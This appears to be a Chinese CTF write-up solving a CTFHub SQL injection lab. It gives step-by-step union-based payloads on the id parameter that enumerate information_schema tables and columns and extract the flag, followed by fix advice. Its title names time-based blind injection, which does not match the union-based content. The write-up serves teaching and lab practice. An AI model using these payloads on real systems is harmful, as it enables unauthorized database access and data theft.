# CTFHub Writeup - 时间盲注

## 题目类型

WEB

## 0x01 题目信息
| 项目 | 内容 |
| --- | --- |
| 题目名称 | CTFHub 技能学习 - MySQL结构 |
| 靶场地址 | `http://challenge-6d88267f8b48a649.sandbox.ctfhub.com:10800` |
| 注入参数 | GET `id` |
| 数据库 | `sqli`（MariaDB 10.3.22） |
| 表 / 字段 | `sesdeweesa` / `jqxtqqhfee`（随机名） |
| Flag | `ctfhub{ee6d5ee49766e8f268e2f90c}` |
## 0x02 漏洞原理
这题考的是「MySQL 的库表结构」，本质还是 SQL 注入，但目标表的名字是随机生成的。
MySQL 里所有元数据都放在 `information_schema` 这个系统库里：
- `information_schema.tables`：记录所有库里的表名；
- `information_schema.columns`：记录每张表的字段名；
- `information_schema.schemata`：记录所有数据库名。
正常的查询流程是「库 → 表 → 字段 → 数据」。平时我们知道表叫 `flag`、字段叫 `flag`，直接查就行；但这题的表名是 `sesdeweesa`、字段名是 `jqxtqqhfee` 这种随机串，靠猜是猜不到的，必须老老实实查 `information_schema`。
页面把查询结果直接回显出来（`ID:` 和 `Data:` 两行），所以可以用 `union select` 把任意查询结果拼到回显位上，不需要盲注。
## 0x03 解题过程
**3.1 找注入点**
首页是一个查询框，GET 传参 `id`。输入 `1` 会回显数据库里的第一条数据：
```
select * from news where id=1
ID: 1
Data: ctfhub
```
加一个单引号：
```
id=1'
```
页面不再显示 `ID` 和 `Data`，说明单引号破坏了 SQL 语法，`id` 处存在注入。因为报错被 `error_reporting(0)` 关掉了，看不到具体错误，只能靠回显判断。
**3.2 判断列数**
用 `order by` 递增试列数：
```
id=1 order by 1   -> 有回显
id=1 order by 2   -> 有回显
id=1 order by 3   -> 无回显
```
说明原查询一共 **2 列**。
**3.3 确认回显位**
直接 `union select 1,2` 时，页面只显示原查询的第一行，看不到 union 的结果。所以要把前半段置空，用一个不存在的 id：
```
id=-1 union select 1,2
```
回显：
```
ID: 1
Data: 2
```
两个位置都能回显，后续把要查的东西放在第 1 列即可。
**3.4 查库名和版本**
```
id=-1 union select database(),version()
```
```
ID: sqli
Data: 10.3.22-MariaDB-0+deb10u1
```
当前库是 `sqli`。顺便看下连接用户：
```
id=-1 union select user(),@@version_compile_os
ID: root@localhost
Data: debian-linux-gnu
```
Web 应用直接用 root 连库，权限很大。
**3.5 查表名**
查当前库下所有表：
```sql
select group_concat(table_name)
from information_schema.tables
where table_schema=database()
```
拼进 payload：
```
id=-1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()
```
回显：
```
ID: sesdeweesa,news
```
除了正常的 `news` 表，还有一张名字很怪的 `sesdeweesa`——这就是放 flag 的表。注意这里的表名是随机生成的，如果按经验去猜 `flag`、`ctfhub` 之类，永远猜不到。
**3.6 查字段名**
接着查这张表的字段：
```sql
select group_concat(column_name)
from information_schema.columns
where table_schema=database() and table_name='sesdeweesa'
```
回显：
```
ID: jqxtqqhfee
```
字段名同样是随机串 `jqxtqqhfee`。作为对照，`news` 表的字段是正常的 `id,data`。
**3.7 取 flag**
把表和字段代进去：
```
id=-1 union select jqxtqqhfee,2 from sesdeweesa limit 0,1
```
回显：
```
ID: ctfhub{ee6d5ee49766e8f268e2f90c}
Data: 2
```
拿到 Flag：
```
ctfhub{ee6d5ee49766e8f268e2f90c}
```
**3.8 验证**
为了确认不是看错，再查三件事：
```
id=-1 union select concat('LEN=',length(jqxtqqhfee)),2 from sesdeweesa limit 0,1
-> LEN=32
id=-1 union select count(*),2 from sesdeweesa
-> 1
id=-1 union select jqxtqqhfee,2 from sesdeweesa where jqxtqqhfee='ctfhub{ee6d5ee49766e8f268e2f90c}'
-> ctfhub{ee6d5ee49766e8f268e2f90c}
```
长度 32、整张表只有 1 行、用等式精确匹配也能查出来，说明 flag 正确且唯一。
## 0x04 完整流程
| 步骤 | 语句 | 结果 |
| --- | --- | --- |
| 判断列数 | `order by 1/2/3` | 2 列 |
| 库名 | `union select database(),version()` | `sqli` |
| 表名 | `information_schema.tables` | `sesdeweesa,news` |
| 字段名 | `information_schema.columns` | `jqxtqqhfee` |
| flag | `select jqxtqqhfee from sesdeweesa` | `ctfhub{ee6d5ee49766e8f268e2f90c}` |
整条链路可以概括为：**`order by` 定列数，`-1 union select` 占回显位，`information_schema` 查结构，最后按「库 → 表 → 字段 → 数据」一层层取到 flag。**
## 0x05 踩坑记录
1. **表名和字段名是随机的**：这题最大的坑就是按经验猜 `flag` 表。实际表名是 `sesdeweesa`、字段是 `jqxtqqhfee`，必须先查 `information_schema`，不能凭习惯写 SQL。
2. **union 前半段要置空**：直接 `1 union select 1,2` 时，页面只显示原查询的第一行，union 的结果被挤掉了。用 `-1` 或 `0` 让前半段查不到数据，回显才会是 union 的内容。
3. **页面只显示第一行**：即使 union 返回多行，页面也只取第一条。所以要么 `limit 0,1`，要么用 `group_concat()` 把多行拼成一行。
4. **注意引号模式**：本题 MySQL 开了 `ANSI_QUOTES`，双引号会被当成标识符而不是字符串。写 `where table_schema="mysql"` 会直接报错、什么都不返回，必须用单引号 `'mysql'`。
5. **报错被关掉了**：`error_reporting(0)` 让报错页面一片空白，无法用报错注入，只能靠回显或盲注。判断注入是否成功，要看 `ID` / `Data` 两行有没有出现。
6. **`group_concat` 有长度限制**：默认 1024 字节，表或字段很多时会被截断，必要时配合 `substr()` 分段。
7. **`database()` 和 `table_schema` 要对应**：查当前库的表要用 `table_schema=database()`，别写成 `table_schema='sqli'` 硬编码，换个环境就失效了。
## 0x06 修复建议
1. **使用预编译（参数化查询）**：`PDO` 的 `prepare/execute` 或 `mysqli` 预处理，把 `id` 作为参数绑定，注入从根上消失。
2. **对输入做类型校验**：`id` 应该是整数，用 `intval()` 强转或正则限制为纯数字。
3. **关闭详细报错**：`display_errors=Off`，错误只写日志；同时不要把执行的 SQL 语句回显到页面（本题把完整 SQL 都打印出来了，等于直接教攻击者怎么写）。
4. **最小权限**：Web 应用不要用 root 连库，只授予业务表所需的 `SELECT` 权限，禁止读取 `information_schema` 之外的系统库。
5. **敏感数据不要只靠「名字猜不到」**：随机表名、随机字段名只是障眼法，`information_schema` 一查就全暴露了，不能当作安全措施。
6. **WAF 兜底**：对 `union select`、`information_schema`、`order by` 等关键字做拦截，但只能作为补充手段。
## 0x07 总结
这道题的核心不是「注入技巧」，而是「MySQL 的结构」。
MySQL 把库、表、字段的元数据都放在 `information_schema` 里，只要能注入，就能把整个数据库的结构翻出来——表叫什么、字段叫什么、有几行数据，全都一目了然。
所以本题的解法很固定：`order by` 定列数 → `-1 union select` 占位 → 查 `information_schema.tables` 找表 → 查 `information_schema.columns` 找字段 → 查数据。表名和字段名再随机，也逃不过这三步。
